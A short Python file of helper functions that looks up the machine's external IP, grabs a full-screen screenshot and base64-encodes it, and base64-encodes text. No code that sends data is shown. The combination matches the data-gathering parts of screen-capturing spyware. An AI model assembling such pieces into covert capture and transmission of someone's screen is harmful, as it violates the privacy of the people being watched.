import requests
import base64
from io import BytesIO
from PIL import ImageGrab

def get_external_ip():
    try:
        ip = requests.get("https://api.ipify.org").text
        return ip
    except:
        return "Unknown IP"

def image_to_base64():
    try:
        screenshot = ImageGrab.grab()
        buffered = BytesIO()
        screenshot.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return img_str
    except Exception as e:
        return ""

def text_to_base64(text):
    try:
        return base64.b64encode(text.encode()).decode()
    except:
        return ""